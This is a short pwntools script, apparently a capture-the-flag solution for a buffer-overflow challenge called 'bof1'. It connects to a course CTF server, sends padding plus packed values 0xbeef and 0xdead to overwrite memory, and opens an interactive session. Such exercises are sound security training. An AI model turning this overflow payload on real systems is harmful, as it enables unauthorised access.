#!/usr/bin/env python2
from pwn import *

file = './bof1'
# server, port = 'localhost'  , 9999
server, port = 'csie.ctf.tw', 10125

r, context.binary = remote(server, port), file
# ========================================================================

r.sendline( 'a' * 8 + p32(0xbeef) + p32(0xdead) )
r.interactive()
